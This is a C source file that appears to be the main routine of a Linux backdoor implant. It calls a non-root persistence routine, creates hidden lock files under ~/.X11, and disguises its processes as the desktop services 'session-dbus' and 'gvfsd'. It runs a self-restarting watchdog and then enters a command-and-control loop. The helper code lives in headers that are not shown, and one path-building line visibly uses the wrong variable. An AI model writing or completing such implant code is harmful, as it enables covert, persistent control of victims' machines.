#include <sys/shm.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
#include <limits.h>
// custom functions
#include "utils.h"
#include "persistence.h"
#include "c2_loop.h"

int main(int argc, char *argv[]) {

    #ifdef DEBUG
    printf("DEBUG MODE ENABLED\n");
    #endif


    nonroot_persistence();

    //if session-dbus lock file is locked... creat the lock for gvfsd and spawn gvfsd
    char *home = getenv("HOME");
    char *lock_path = "/.X11/.X11-lock";
    char *lock_path_2 = "/.X11/.X0-lock";
    char *home_lock_path = (char *)malloc(PATH_MAX);
    char *home_lock_path_2 = (char *)malloc(PATH_MAX);

    memset(home_lock_path, 0, PATH_MAX);
    memset(home_lock_path_2, 0, PATH_MAX);

    memcpy(home_lock_path, home, strlen(home));
    memcpy(home_lock_path_2, home, strlen(home));

    strncat(home_lock_path, lock_path, strlen(lock_path));
    strncat(home_lock_path_2, lock_path, strlen(lock_path_2));

    //ex: lock_check("/home/gdev/.X11/.X11-lock")
    if (lock_check(home_lock_path) != 0) {

        create_lock(0);  // lock file created, when gvfspd spawns session-dbus, the top loop will run forever.
        spawn_thread_watchdog(0);

        // forever run session-dbus as a "watchdog process".
        do {
            sleep(10);
        }while(true);

    }

    create_lock(1);

     //session-dbus create
    spawn_thread_watchdog(1);
    c2_loop();

    return 0;
 }

